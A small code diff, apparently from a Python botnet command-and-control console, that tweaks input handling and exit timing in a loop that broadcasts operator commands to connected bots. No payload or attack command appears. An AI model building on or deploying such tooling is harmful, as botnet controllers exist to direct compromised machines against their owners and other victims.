@@ -13,13 +13,14 @@ class  serverThread(threading.Thread):
 
     def run(self):
         while True:
-            consoleSnd = input('[BotNet]$ ')
+            consoleSnd = str(input('[BotNet]$ '))
             if(consoleSnd == ""):
                 pass
             elif(consoleSnd == "exit"):
                 for i in range(len(threads)):
                     self.principalQueue.put(consoleSnd)
-                    time.sleep(1)
+                    time.sleep(0.1)
+                time.sleep(1)
                 os._exit(0)
             else:
                 print('[+] Enviando comando ::{}:: a {} bots'.format(consoleSnd,str(len(threads))))
